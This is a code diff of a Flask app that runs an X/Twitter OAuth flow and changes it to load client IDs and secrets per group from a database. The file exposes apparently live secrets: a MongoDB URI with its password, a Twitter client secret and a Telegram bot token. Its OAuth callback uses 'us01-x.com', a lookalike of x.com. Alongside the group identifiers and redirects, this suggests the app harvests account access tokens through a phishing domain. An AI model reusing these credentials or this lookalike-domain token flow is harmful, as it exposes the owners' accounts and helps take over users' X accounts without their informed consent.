@@ -11,11 +11,8 @@ app.secret_key = secrets.token_hex(16)
 
 MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"
 
-TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
 TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'
 TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
-
-credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
 
 client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
 db = client['cobra_db']
@@ -39,7 +36,11 @@ def oauth():
     group = groups.find_one({"identifier": identifier})
     if not group:
         return "⚠️ Identifier is invalid.", 404
-
+    
+    twitter = group.get("twitter_settings")
+    session["client_id"] = twitter["client_id"]
+    session["client_secret"] = twitter["client_secret"]
+    
     session["redirect_url"] = group.get('redirect')
     session["group_id"] = group.get("group_id")
     
@@ -61,6 +62,7 @@ def oauth():
 
 
 def generate_twitter_oauth_url():
+    TWITTER_CLIENT_ID = session.get("client_id")
     TWITTER_CALLBACK_URL = 'https%3A%2F%2Fus01-x.com%2Fauth'
     return (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
             f'&redirect_uri={TWITTER_CALLBACK_URL}'
@@ -128,6 +130,10 @@ def auth_callback():
 
 
 def exchange_token_for_access(authorization_code):
+    TWITTER_CLIENT_ID = session.get("client_id")
+    TWITTER_CLIENT_SECRET = session.get("client_secret")
+    credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
+
     token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
     request_data = {
         'grant_type': 'authorization_code',
